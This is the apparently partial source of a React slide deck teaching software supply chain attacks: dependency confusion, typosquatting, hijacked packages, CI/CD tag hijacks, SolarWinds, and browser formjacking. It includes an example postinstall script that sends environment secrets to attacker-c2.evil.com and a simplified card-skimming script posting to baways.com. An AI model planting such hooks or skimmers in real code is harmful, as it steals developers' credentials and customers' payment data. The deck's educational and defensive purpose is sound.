import SlidePresenter from '../components/SlidePresenter';
import CodeBlock from '../components/CodeBlock';

function YouTubeEmbed({ id, caption }) {
  return (
    <div className="video-embed">
      <iframe
        src={`https://www.youtube.com/embed/${id}`}
        title={caption}
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      />
      <div className="video-caption">
        <span className="yt-icon">&#9654;</span> {caption}
      </div>
    </div>
  );
}

function FlowDiagram({ steps }) {
  return (
    <div className="flow-diagram">
      {steps.map((s, i) => (
        <span key={i} style={{ display: 'contents' }}>
          <div className={`flow-box ${s.type || ''}`}>
            <h5>{s.label}</h5>
            <p>{s.desc}</p>
          </div>
          {i < steps.length - 1 && <span className={`flow-arrow ${s.arrowType || ''}`}>&rarr;</span>}
        </span>
      ))}
    </div>
  );
}

const slides = [
  {
    tag: 'Part 1 // Introduction',
    title: 'What is a <span class="highlight">Supply Chain Attack</span>?',
    content: (
      <>
        <div className="slide-quote">
          &ldquo;You don't hack the castle &mdash; you <strong>poison the food supply</strong> going into the castle.&rdquo;
        </div>

        <div className="definition-with-image">
          <div className="definition-text">
            <p>
              A <strong>supply chain attack</strong> is a type of cyberattack where hackers don&apos;t target the main
              victim directly &mdash; instead, they compromise a <strong>trusted third-party</strong> (like software vendors,
              libraries, or service providers) to reach many victims at once.
            </p>
            <p>
              <strong>🔍 Simple Idea:</strong> Instead of breaking into your system directly, attackers
              &rarr; <strong>Hack something you trust</strong>, then &rarr; <strong>Use it to infect you</strong>.
            </p>
          </div>
          <div className="definition-image">
            <img src="/supply-chain-attack.png" alt="Supply chain attack diagram" />
          </div>
        </div>

        <p>
          <strong>🍔 Real-world analogy:</strong> Imagine you go to a restaurant and order food.
          The restaurant buys ingredients from a supplier. If the supplier provides <strong>contaminated
          food</strong>, you get sick &mdash; even though the restaurant is trusted. You never dealt with the
          supplier directly. You trusted the restaurant, and the restaurant trusted the supplier.
          Software supply chain attacks work the <em>exact</em> same way &mdash; you trust the package name, the npm registry, the digital signature.
          The attacker poisons the ingredient before it reaches you.
        </p>
        <p>
          In software, we depend on <strong>hundreds of third-party components</strong> &mdash; npm packages, GitHub Actions,
          CDN scripts, Docker images. A supply chain attack doesn't target <em>you</em> directly. It targets something
          <strong> you trust</strong>, then rides that trust straight through your front door.
        </p>

        <div className="illustration">
          <div className="illustration-label">The trust chain attackers exploit</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Compromises a component', type: 'attacker', arrowType: 'danger' },
              { label: 'Package / Tool', desc: 'Library, Action, or CDN', type: 'compromised', arrowType: 'danger' },
              { label: 'Trusted Channel', desc: 'npm, update server, CI/CD' },
              { label: 'Victim Org', desc: '1,000s of downstream users', type: 'victim' },
            ]} />
          </div>
        </div>

       

        <div className="illustration">
          <div className="illustration-label">Upstream vs Downstream</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'UPSTREAM', desc: 'Attacker gains access to 3rd-party tool', type: 'attacker', arrowType: 'danger' },
              { label: 'Dependency', desc: 'Library, plugin, CI action, CDN script', type: 'compromised', arrowType: 'danger' },
              { label: 'DOWNSTREAM', desc: 'Malware reaches target via browser/device', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Why It Matters',
    title: 'Why Supply Chain Attacks are <span class="highlight">Devastating</span>',
    content: (
      <>
        <p>
          Let me put this in perspective. When you run <code>npx create-react-app my-app</code>, you download
          <strong> over 1,400 packages</strong> from 800+ maintainers. Did you audit any of them? No. Nobody does.
          That blind trust is what makes supply chain attacks so devastating.
        </p>
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>700+</h4>
            <p>Average transitive dependencies in a Node.js app. Each one is a potential entry point for an attacker.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Trust Bypass</h4>
            <p>Your firewall won't stop it. Your antivirus won't flag it. It arrives through <em>trusted</em>, digitally signed channels.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Massive Scale</h4>
            <p>One compromised package = millions of victims. <code>colors.js</code> broke 19,000 projects when its own maintainer sabotaged it in January 2022.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Hard to Detect</h4>
            <p>The SolarWinds backdoor hid inside a legitimately signed update for 9 months. It passed every security check.</p>
          </div>
        </div>
        <p><strong>These aren't hypothetical threats. Here are real numbers:</strong></p>
        <ul>
          <li><strong>SolarWinds (2020):</strong> 18,000+ organizations compromised including the US Treasury, Homeland Security, and Microsoft. Attackers were inside for 9 months.</li>
          <li><strong>tj-actions (2025):</strong> A single compromised GitHub Action cascaded to 23,000+ repositories, leaking CI/CD secrets at scale.</li>
          <li><strong>Trivy Action (2026):</strong> A <em>security scanner</em> was turned into a weapon &mdash; 10,000+ CI/CD workflows leaked credentials. The irony is the tool you trusted to find vulnerabilities <em>was</em> the vulnerability.</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Taxonomy',
    title: 'Attack Surface <span class="highlight">Taxonomy</span>',
    content: (
      <div className="taxonomy">
        <div className="taxonomy-cat">
          <h4>Source Code</h4>
          <ul>
            <li>Compromised repository</li>
            <li>Malicious commits</li>
            <li>Git submodule attacks</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Dependencies</h4>
          <ul>
            <li>Dependency confusion</li>
            <li>Typosquatting</li>
            <li>Malicious updates</li>
            <li>Transitive dep attacks</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Build System</h4>
          <ul>
            <li>CI/CD pipeline compromise</li>
            <li>Build tool compromise</li>
            <li>Package signing bypass</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Distribution</h4>
          <ul>
            <li>Compromised update servers</li>
            <li>Registry mirror poisoning</li>
            <li>Web cache poisoning</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Browser / Runtime</h4>
          <ul>
            <li>Malicious JS libraries</li>
            <li>Browser extensions</li>
            <li>Compromised CDNs</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Client-Side</h4>
          <ul>
            <li>Magecart / Formjacking</li>
            <li>Watering hole attacks</li>
            <li>Cryptojacking scripts</li>
          </ul>
        </div>
      </div>
    ),
  },
  {
    tag: 'Part 1 // MITRE ATT&CK',
    title: '<span class="highlight">MITRE ATT&CK</span> T1195',
    content: (
      <>
        <p>
          Supply Chain Compromise falls under the <strong>Initial Access</strong> tactic in the MITRE ATT&CK framework.
        </p>
        <table className="slide-table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Sub-Technique</th>
              <th>Description</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>T1195.001</code></td>
              <td>Dependencies & Dev Tools</td>
              <td>Manipulating packages, libraries, or development tools</td>
            </tr>
            <tr>
              <td><code>T1195.002</code></td>
              <td>Software Supply Chain</td>
              <td>Manipulating update servers, build pipelines, delivery mechanisms</td>
            </tr>
            <tr>
              <td><code>T1195.003</code></td>
              <td>Hardware Supply Chain</td>
              <td>Manipulating hardware components or firmware</td>
            </tr>
          </tbody>
        </table>
        <p>
          <strong>Related techniques:</strong> T1059 (Scripting), T1071 (Application Layer Protocol),
          T1027 (Obfuscation), T1078 (Valid Accounts)
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type A',
    title: '<span class="highlight">Dependency Confusion</span>',
    content: (
      <>
        <p>
          Modern software projects rely on package managers (npm, pip, Maven) that pull dependencies from
          <strong> registries</strong>. Companies often run <strong>two registries</strong>: a <em>private</em> one
          for internal packages (e.g., <code>mycompany-auth-utils</code>) and the <em>public</em> one (npmjs.com).
          The critical question is: <strong>what happens when the same package name exists on both?</strong>
        </p>

        <p>
          Here&apos;s the flaw: most package managers resolve by <strong>highest version number</strong> across all
          configured registries. So if an attacker publishes <code>mycompany-auth-utils@99.0.0</code> on the
          public npm registry, and the company&apos;s private registry has <code>mycompany-auth-utils@1.2.3</code>,
          the package manager picks <strong>v99.0.0 &mdash; the attacker&apos;s version</strong>. The developer
          runs <code>npm install</code>, gets the malicious package, and any lifecycle hooks (<code>preinstall</code>,
          <code> postinstall</code>) execute automatically. That&apos;s the &ldquo;confusion&rdquo; &mdash; the
          package manager is confused about which registry is authoritative.
        </p>

        <div className="illustration">
          <div className="illustration-label">How version resolution is exploited</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Private Registry', desc: 'my-utils@1.2.3', type: '' },
              { label: 'npm install', desc: 'resolves highest version', type: 'compromised', arrowType: '' },
              { label: 'Public Registry', desc: 'my-utils@99.0.0', type: 'attacker', arrowType: 'danger' },
              { label: 'Victim Machine', desc: 'Installs v99.0.0!', type: 'victim' },
            ]} />
          </div>
        </div>

        <p><strong>Why it works:</strong></p>
        <ul>
          <li><strong>Naming is global:</strong> There&apos;s no reservation system &mdash; anyone can publish any unscoped package name on public npm.</li>
          <li><strong>Version wins:</strong> Package managers default to the highest available version that satisfies the range (<code>^1.0.0</code> allows <em>any</em> version {'>'}= 1.0.0, including 99.0.0).</li>
          <li><strong>Lifecycle hooks are automatic:</strong> <code>preinstall</code> / <code>postinstall</code> scripts run without any user prompt.</li>
          <li><strong>Internal names leak easily:</strong> They appear in JavaScript source maps, error messages, leaked <code>package.json</code> files, and GitHub repos.</li>
        </ul>

        <p>
          <strong>Real-world proof &mdash; Alex Birsan (February 2021):</strong> Security researcher Alex Birsan
          used this exact technique to get code execution inside <strong>Apple, Microsoft, PayPal, Shopify,
          Netflix, Tesla, and Uber</strong>. He found internal package names in leaked files, published the same names
          on public npm with version <code>99.0.0</code> containing a harmless DNS callback, and waited. When
          developers at these companies ran <code>npm install</code>, his code ran on their build servers. He
          earned <strong>$130,000+ in bug bounties</strong> from this single technique.
        </p>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Step 1: Recon</h4>
            <p>Birsan found internal package names in leaked <code>package.json</code> files, JavaScript source maps on public websites, and error messages that referenced private modules. Companies accidentally leak these names all the time.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 2: Publish</h4>
            <p>He registered the <em>exact same package name</em> on public npm with version <code>99.0.0</code>. The package contained a harmless DNS callback to prove code execution &mdash; no destructive payload.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 3: Confusion</h4>
            <p>When developers at Apple/Microsoft ran <code>npm install</code>, npm saw v99.0.0 on public vs v1.2.3 on private. <strong>Higher version wins.</strong> The malicious public package was installed instead.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 4: Execution</h4>
            <p>The <code>postinstall</code> hook ran <strong>automatically</strong> during install &mdash; no user interaction needed. Birsan got DNS callbacks from Apple&apos;s internal build servers, Microsoft&apos;s Azure DevOps, and PayPal&apos;s CI/CD pipelines.</p>
          </div>
        </div>

        <p><strong>What a real attacker&apos;s postinstall hook looks like:</strong></p>
        <CodeBlock
          language="javascript"
          filename="malicious postinstall.js"
          code={`const os = require('os');
const https = require('https');

// Runs AUTOMATICALLY during npm install — no user consent
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  env: process.env  // AWS_SECRET_KEY, NPM_TOKEN, DB_PASSWORD...
});

https.request({
  hostname: 'attacker-c2.evil.com',
  path: '/exfil', method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}).end(data);
// The developer sees "npm install" succeed normally.
// They have no idea this script just ran.`}
        />

        <div className="slide-quote">
          Birsan&apos;s takeaway: &ldquo;Squatting valid internal package names was a nearly sure-fire method to get into
          the networks of some of the biggest tech companies out there, getting remote code execution, and
          possibly allowing attackers to add backdoors during builds.&rdquo;
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type B',
    title: '<span class="highlight">Typosquatting</span>',
    content: (
      <>
        <p>
          This is the <strong>simplest</strong> supply chain attack and it works embarrassingly well.
          Think about how you install packages: <code>npm install expresss</code> &mdash; notice the extra "s"?
          You probably wouldn't. Attackers register these misspelled names and wait for developers to make typos.
        </p>

        <p>
          <strong>Real incident &mdash; crossenv (2017):</strong> An attacker published a package called <code>crossenv</code>
          (no hyphen) that mimicked the popular <code>cross-env</code> (with hyphen, 1.5M weekly downloads).
          The fake package <strong>looked identical</strong> &mdash; same README, same API &mdash; but silently stole
          all environment variables (including npm tokens, AWS keys, database passwords) and sent them to a
          remote server. It was downloaded <strong>700+ times</strong> over 2 weeks before being discovered.
          Think about it: 700 developers' credentials, potentially accessing production systems.
        </p>

        <table className="slide-table">
          <thead>
            <tr><th>Legitimate</th><th>Typosquat</th><th>Technique</th><th>What Catches Devs</th></tr>
          </thead>
          <tbody>
            <tr><td><code>lodash</code></td><td><code>lodahs</code></td><td>Character swap</td><td>Typing fast, not looking</td></tr>
            <tr><td><code>cross-env</code></td><td><code>crossenv</code></td><td>Missing hyphen</td><td>Forgetting the separator</td></tr>
            <tr><td><code>colors</code></td><td><code>colros</code></td><td>Letter transposition</td><td>Common typo pattern</td></tr>
            <tr><td><code>express</code></td><td><code>expresss</code></td><td>Extra letter</td><td>Double-tap on keyboard</td></tr>
            <tr><td><code>@angular/core</code></td><td><code>angular-core</code></td><td>Scope confusion</td><td>Forgetting the @ scope</td></tr>
          </tbody>
        </table>

        <p>
          What makes this attack clever: the malicious package <strong>re-exports the real package</strong>.
          So <code>crossenv</code> internally does <code>require('cross-env')</code> &mdash; everything works perfectly.
          Your tests pass. Your app runs fine. Meanwhile, credentials are being exfiltrated.
          The developer has <strong>zero indication</strong> anything is wrong.
        </p>

        <p>
          <strong>Scale of the problem:</strong> In 2023, researchers from Checkmarx found over <strong>14,000 typosquat
          packages</strong> on npm alone. PyPI and RubyGems are equally affected. Some attackers automate this &mdash; they
          generate all possible 1-character misspellings of the top 1,000 packages and register them in bulk.
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type C',
    title: '<span class="highlight">Compromised Packages</span> & Malicious Updates',
    content: (
      <>
        <p>
          This is <strong>the most dangerous</strong> supply chain attack vector because it weaponizes <em>legitimate trust</em>.
          The attacker doesn't create a new package &mdash; they <strong>take over an existing, popular one</strong>
          that thousands of projects already depend on.
        </p>

        <p>
          <strong>The event-stream story (2018):</strong> Dominic Tarr maintained <code>event-stream</code>, a package
          with <strong>2 million weekly downloads</strong>. He was burned out &mdash; unpaid, overwhelmed, maintaining
          open source for free. A user named "right9ctrl" offered to help maintain it. Tarr thought:
          &ldquo;Great, someone who cares.&rdquo; He handed over publishing rights.
        </p>
        <p>
          right9ctrl then added a dependency called <code>flatmap-stream</code> that contained <strong>AES-encrypted
          malicious code</strong> hidden inside a test fixture file. The decryption key? It was derived from
          the <code>description</code> field in the <strong>Copay Bitcoin wallet's</strong> <code>package.json</code>.
          This meant the code <em>only activated inside the Copay wallet app</em>. Everywhere else it was dormant.
          When triggered, it intercepted Bitcoin private keys during transaction signing and sent them to the attacker.
        </p>

        <div className="slide-quote">
          Dominic Tarr's response on GitHub: &ldquo;I don't get any reward for maintaining this module. I don't even
          use it anymore. He mass-emailed me and offered to maintain the module, so I gave it to him.
          He seemed enthusiastic.&rdquo;
        </div>

        <p><strong>Why this pattern is terrifying:</strong></p>
        <ul>
          <li><strong>Legitimate history:</strong> The package had years of real commits, thousands of stars, and a real community. Your audit tools see a "trusted" package.</li>
          <li><strong>Signed & checksummed:</strong> The malicious version was published through npm's official channel. It had a valid checksum. Nothing was "tampered with" &mdash; it was a legitimate publish by an authorized maintainer.</li>
          <li><strong>Auto-updated:</strong> If you use Dependabot or Renovate, the malicious update could be auto-merged without human review.</li>
          <li><strong>Targeted payload:</strong> The code only activated in one specific environment (Copay). If you weren't Copay, your tests passed, your app worked, you had no clue.</li>
          <li><strong>Discovered by accident:</strong> A developer noticed the suspicious dependency while reviewing updates. If they hadn't been curious, it could have lasted months longer.</li>
        </ul>

        <p>
          <strong>This keeps happening:</strong> In 2022, the maintainer of <code>colors.js</code> and <code>faker.js</code>
          (Marak Squires) deliberately sabotaged his own packages, adding an infinite loop that printed garbage.
          <strong>19,000+ projects</strong> broke overnight. Different motive (protest, not theft), same lesson:
          the open source maintainers you depend on are often one person, unpaid, and one bad day away from causing chaos.
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type D',
    title: '<span class="highlight">CI/CD Pipeline</span> Attacks',
    content: (
      <>
        <p>
          Think of CI/CD (GitHub Actions, Jenkins, etc.) as <strong>the robot that builds and deploys
          your app</strong>. To do its job, it needs <em>all the keys</em>: your npm token, AWS
          credentials, database passwords. That makes it the <strong>single most powerful thing</strong> in
          your project. If an attacker tricks the robot into running <em>their</em> code, they get every
          secret it has access to.
        </p>

        <div className="illustration">
          <div className="illustration-label">How a CI/CD attack works — step by step</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: '1. Steal a key', desc: "Get a maintainer's login token", type: 'attacker', arrowType: 'danger' },
              { label: '2. Swap the code', desc: 'Move git tag to evil commit', type: 'compromised', arrowType: 'danger' },
              { label: '3. CI runs it', desc: 'Robot executes evil code', type: 'victim', arrowType: 'danger' },
              { label: '4. Secrets leak', desc: 'Tokens sent to attacker', type: 'attacker' },
            ]} />
          </div>
        </div>

        <p>
          <strong>Real incident — tj-actions (March 2025):</strong> A popular GitHub Action called
          <code>tj-actions/changed-files</code> was used by <strong>23,000+ projects</strong>.
          Attackers stole the maintainer's password-like token (PAT), then <em>moved</em> the
          version tag <code>@v35</code> to point at malicious code. Every project that
          used <code>@v35</code> now unknowingly ran the attacker's code in their CI &mdash; and it
          printed out every secret. The attacker then used <em>those</em> stolen secrets to compromise
          even more Actions. One breach turned into many.
        </p>

        <p>
          <strong>It happened again — Trivy (March 2026):</strong> Using secrets stolen from tj-actions,
          attackers poisoned <code>aquasecurity/trivy-action</code> &mdash; a <strong>security
          scanner</strong> (the irony: the tool meant to <em>find</em> vulnerabilities became one).
          <strong>10,000+</strong> CI pipelines leaked credentials. Those stolen npm tokens were then used
          to publish malware that used blockchain for its command server, making it nearly impossible to shut down.
        </p>

        <CodeBlock
          language="yaml"
          filename=".github/workflows/ci.yml — VULNERABLE vs SAFE"
          code={`# VULNERABLE — tag is just a label, attacker can move it:
- uses: tj-actions/changed-files@v35

# SAFE — SHA is a unique fingerprint, nobody can change it:
- uses: tj-actions/changed-files@abc123def456`}
        />

        <p>
          <strong>The one-line fix:</strong> Pin Actions to a <strong>SHA hash</strong> instead of a
          version tag. A tag like <code>@v4</code> is just a sticky note &mdash; anyone with access can
          peel it off and stick it on different code. A SHA like <code>@abc123...</code> is a
          fingerprint &mdash; it always points to the exact same code, forever. If everyone had done this,
          both attacks would have failed.
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type E',
    title: '<span class="highlight">Build Process</span> Compromise',
    content: (
      <>
        <div className="slide-quote">
          &ldquo;You write an essay, proofread it carefully, and hand it to the printer.
          The printer <strong>secretly changes a paragraph</strong>, prints 18,000 copies,
          then puts the original back. Nobody ever sees the change &mdash;
          except every reader.&rdquo;
        </div>

        <p>
          That&apos;s a build process compromise in one sentence. The source code is clean,
          code review finds nothing, tests pass &mdash; but the <strong>compiled program
          has a backdoor</strong> injected during the build step. This is widely considered
          the <strong>hardest supply chain attack to detect</strong>.
        </p>

        <div className="illustration">
          <div className="illustration-label">The concept at a glance</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Clean Repo', desc: 'No malicious code anywhere', type: '' },
              { label: 'Build Server', desc: 'Secretly tampered with', type: 'attacker', arrowType: 'danger' },
              { label: 'Compiled Binary', desc: 'Backdoor baked in', type: 'compromised', arrowType: 'danger' },
              { label: 'Signed Update', desc: 'Looks 100% legitimate', type: 'victim' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Who</h4>
            <p><strong>APT29 / Cozy Bear</strong> &mdash; Russian intelligence (SVR). One of the most sophisticated state-sponsored groups in the world.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Target</h4>
            <p><strong>SolarWinds Orion</strong> &mdash; a network monitoring platform used by <strong>300,000 customers</strong>, including most Fortune 500 companies and US government agencies.</p>
          </div>
          <div className="slide-grid-item">
            <h4>The Key Insight</h4>
            <p>They didn&apos;t touch the source code &mdash; code review would catch that. They poisoned the <strong>build server</strong>, so the compiled output had a backdoor the source never showed.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Patience</h4>
            <p>The attackers spent <strong>months</strong> inside SolarWinds&apos; network doing recon before ever touching the build system. They studied how builds worked first.</p>
          </div>
        </div>

        <div className="slide-quote">
          This is the attack that put &ldquo;supply chain&rdquo; on every CISO&apos;s radar.
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // SUNSPOT — How It Worked',
    title: 'SUNSPOT: The <span class="highlight">4-Step Trick</span>',
    content: (
      <>
        <p>
          <strong>SUNSPOT</strong> was the implant APT29 planted on SolarWinds&apos; build server.
          It didn&apos;t run all the time &mdash; it <em>waited</em> for the exact moment Orion
          was being compiled, did its work in seconds, then covered its tracks. Here&apos;s
          the step-by-step:
        </p>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Step 1: Watch</h4>
            <p>SUNSPOT quietly monitored for <code>MsBuild.exe</code> processes on the build server. The moment Orion started compiling, it woke up.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 2: Swap</h4>
            <p>It replaced <strong>a single source file</strong> with a backdoored version containing the SUNBURST payload. Just one file out of thousands &mdash; that&apos;s all it took.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 3: Compile</h4>
            <p>The build server compiled Orion normally &mdash; including the swapped file. The backdoor was now <strong>baked into the DLL</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 4: Restore</h4>
            <p>After compilation finished, SUNSPOT <strong>put the original file back</strong>. Developers checking the repo saw nothing. No diff. No trace. No evidence.</p>
          </div>
        </div>

        <div className="illustration">
          <div className="illustration-label">SUNSPOT&apos;s operation — the &ldquo;evil printer&rdquo;</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: '1. WATCH', desc: 'Monitors for MsBuild.exe', type: 'attacker', arrowType: 'danger' },
              { label: '2. SWAP', desc: 'Replaces source file mid-compile', type: 'compromised', arrowType: 'danger' },
              { label: '3. BUILD', desc: 'Backdoor compiled into DLL', type: 'compromised', arrowType: 'danger' },
              { label: '4. RESTORE', desc: 'Original file put back — no trace', type: 'attacker' },
            ]} />
          </div>
        </div>

        <p>
          The result: a trojanized DLL, <strong>legitimately signed by SolarWinds&apos; own
          code-signing certificate</strong>. No developer ever saw malicious code in the repo.
          The backdoor existed <em>only</em> in the compiled binary that shipped to 18,000 customers.
        </p>

        <div className="slide-quote">
          Why not just modify the repo? Because code review would catch it. SUNSPOT was
          brilliant precisely because it <strong>only existed during the brief window
          of compilation</strong> &mdash; then erased its tracks completely.
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // SUNBURST — Staying Hidden',
    title: 'SUNBURST: How It <span class="highlight">Stayed Hidden</span> for 9 Months',
    content: (
      <>
        <p>
          Getting the backdoor into the binary was only half the job. The payload
          (<strong>SUNBURST</strong>) also had to <strong>avoid detection</strong> once installed
          on thousands of networks. It used four techniques:
        </p>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>2-Week Sleep</h4>
            <p>After installation, it <strong>did nothing for 12&ndash;14 days</strong>. Testing and QA never saw malicious behavior &mdash; it only woke up in production.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Disguised Traffic</h4>
            <p>Command-and-control calls were <strong>disguised as normal Orion API traffic</strong>. To a network analyst, it looked like routine SolarWinds telemetry.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Anti-Analysis</h4>
            <p>It <strong>checked for security tools</strong> (Wireshark, Fiddler, debuggers) and <em>shut itself off</em> if it detected anyone watching.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Signed &amp; Trusted</h4>
            <p>The DLL was signed with <strong>SolarWinds&apos; real certificate</strong>. Every antivirus, firewall, and allowlist treated it as legitimate software.</p>
          </div>
        </div>

        <div className="illustration">
          <div className="illustration-label">Why every defense layer failed</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Code Review', desc: 'Repo was clean', type: '' },
              { label: 'Tests', desc: 'All passed', type: '' },
              { label: 'Antivirus', desc: 'Signed = trusted', type: '' },
              { label: 'Firewall', desc: 'Traffic looked normal', type: '' },
              { label: 'RESULT', desc: 'Undetected for 9 months', type: 'attacker' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>18,000+</h4>
            <p>Organizations installed the trojanized update &mdash; including the <strong>US Treasury</strong>, <strong>Homeland Security</strong>, the Pentagon, and <strong>Microsoft</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>~100 Exploited</h4>
            <p>Around 100 high-value targets were <strong>hand-picked for deeper espionage</strong>. The rest served as cover &mdash; hiding in the noise of a massive install base.</p>
          </div>
          <div className="slide-grid-item">
            <h4>9 Months</h4>
            <p>The backdoor operated from <strong>March to December 2020</strong>. Nine months of access to the US government before anyone noticed.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Caught by Accident</h4>
            <p>FireEye (now Mandiant) noticed someone stole <em>their</em> red-team tools. Investigating their own breach, they traced it to a SolarWinds update. <strong>Without this accident, it could have lasted years.</strong></p>
          </div>
        </div>

        <div className="slide-quote">
          The nightmare scenario: your source code is perfect, your tests pass, your code review
          is clean &mdash; but the program your users install has a backdoor, signed with <em>your
          own certificate</em>. No developer ever saw malicious code in the repo. No amount
          of reading the source would catch this.
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type F',
    title: '<span class="highlight">Browser-Based</span> Supply Chain Attacks',
    content: (
      <>
        <p>
          Every website you visit loads third-party JavaScript: analytics, fonts, chat widgets, CDN libraries.
          Each one is a <strong>potential supply chain attack vector</strong>. If any of those scripts is compromised,
          <em>every visitor</em> to your site becomes a victim.
        </p>

        <div className="illustration">
          <div className="illustration-label">Browser-based attack flow</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Compromises JS lib or extension', type: 'attacker', arrowType: 'danger' },
              { label: 'CDN / Store', desc: 'Serves malicious code', type: 'compromised', arrowType: 'danger' },
              { label: 'User Browser', desc: 'Auto-executes script', type: 'victim', arrowType: 'danger' },
              { label: 'Stolen Data', desc: 'Cookies, sessions, keystrokes', type: 'attacker' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Magecart / Formjacking</h4>
            <p>
              <strong>British Airways (2018):</strong> Magecart Group 6 injected 22 lines of JavaScript into BA's
              payment page. For <strong>15 days</strong>, every credit card entered on ba.com was silently copied
              to the attackers' server. <strong>380,000 transactions</strong> compromised. BA was fined
              <strong> £20 million</strong> by the UK ICO. The script was tiny &mdash; just a modified version of
              the Modernizr library already on the page.
            </p>
          </div>
          <div className="slide-grid-item">
            <h4>polyfill.io (2024)</h4>
            <p>
              <strong>The scariest CDN attack ever:</strong> polyfill.io was a trusted CDN used by <strong>100,000+
              websites</strong> to serve JavaScript polyfills. In February 2024, a Chinese company (Funnull) bought
              the domain. They started injecting malicious redirects into the served JavaScript &mdash; sending
              users to betting and scam sites. The websites loading the script had <strong>no idea</strong>.
              Google blocked ads on affected sites. Cloudflare and Fastly created emergency mirror URLs.
            </p>
          </div>
          <div className="slide-grid-item">
            <h4>Watering Hole</h4>
            <p>
              <strong>SolarWinds customers (2020-21):</strong> After the SolarWinds breach, attackers also
              compromised the website of a government contractor that USAID employees frequently visited.
              Visitors were served a zero-day exploit. This is classic watering hole &mdash; compromise the
              "watering hole" where your targets gather, instead of attacking them directly.
            </p>
          </div>
          <div className="slide-grid-item">
            <h4>Cryptojacking</h4>
            <p>
              <strong>Coinhive (2017-2019):</strong> A "legitimate" browser mining service that was overwhelmingly
              used for cryptojacking. It was injected into government websites (.gov.uk, uscourts.gov),
              pirate streaming sites, and WordPress plugins. At its peak, it was found on <strong>30,000+
              websites</strong>. Visitors' CPUs mined Monero for attackers while pages loaded slowly.
            </p>
          </div>
        </div>

        <CodeBlock
          language="html"
          filename="British Airways formjacking (simplified)"
          code={`<!-- The original BA payment page loaded Modernizr normally.
     Attackers modified it to also run this: -->
<script>
document.getElementById('checkout')
  .addEventListener('submit', function(e) {
    // Grab card details the user just typed
    var cardData = new FormData(e.target);
    // Send a copy to attacker's server (baways.com — NOT ba.com!)
    fetch('https://baways.com/gateway/app/data498', {
      method: 'POST',
      body: cardData
    });
    // Original form submission continues normally
    // User has no idea their card was just stolen
  });
</script>
<!-- 380,000 cards stolen. £20M fine. 22 lines of code. -->`}
        />
      </>
    ),
  },
  {
    tag: 'Part 1 // Kill Chain',
    title: 'Supply Chain Attack <span class="highlight">Kill Chain</span>',
    content: (
      <div className="killchain">
        <div className="killchain-step">
          <div className="killchain-num">PHASE 01</div>
          <h4>Recon</h4>
          <p>Discover dependencies, internal names, CI/CD tools</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 02</div>
          <h4>Compromise</h4>
          <p>Steal credentials, create typosquat, social engineer</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 03</div>
          <h4>Injection</h4>
          <p>Insert payload into package, action, or build</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 04</div>
          <h4>Distribution</h4>
          <p>Flows through trusted update channels</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 05</div>
          <h4>Activation</h4>
          <p>Install hooks, runtime, or delayed trigger</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 06</div>
          <h4>Exploitation</h4>
          <p>Exfil data, backdoors, lateral movement</p>
        </div>
      </div>
    ),
  },
  {
    tag: 'Part 1 // Comparison',
